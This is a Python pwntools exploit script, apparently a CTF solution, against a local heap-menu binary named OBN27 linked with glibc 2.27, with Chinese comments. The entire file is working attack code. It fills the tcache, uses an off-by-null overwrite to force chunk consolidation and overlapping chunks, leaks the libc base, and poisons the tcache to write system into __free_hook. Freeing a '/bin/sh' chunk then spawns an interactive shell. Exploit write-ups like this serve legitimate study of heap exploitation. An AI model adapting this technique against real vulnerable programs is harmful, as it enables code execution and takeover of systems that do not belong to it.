#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./OBN27')
libc = ELF('./libc-2.27.so')
#libc = ELF('./libc-2.27-1.6.so')
elf = ELF('./OBN27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

for i in range(7):
	add(0xf8)

add(0xf8) #7 0x950
add(0x88) #8 0xa50
add(0xf8) #9 0xae0
add(0x10) #10 0xbe0

#填满 tcachebin
for i in range(7):
	delete(i)

delete(7) # 放入 unsortedbin
delete(8) # 放入 tcachebin

add(0x88) #11 use chunk8, off by null，修改 chunk9 的 size 位
edit(11, 'A'*0x80+p64(0x190))
delete(9) #向上合并堆块
#这样就控制了 chunk8

#分割unsortedbin
add(0x70) #12
edit(12, '/bin/sh')
add(0x70) #13

show(11)
libcbase = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3ebca0
system = libcbase + libc.sym['system']
free_hook = libcbase + libc.sym['__free_hook']
pr("libcbase",libcbase)
pr('system',system)
pr('free_hook',free_hook)

add(0x10) #14 0xa50

delete(10)
delete(14)

edit(11, p64(free_hook))
add(0x10) #15 use 0xa50
add(0x10) #16 分配至free_hook
edit(16, p64(system)) #把 system 写入 free_hook

delete(12)
p.interactive()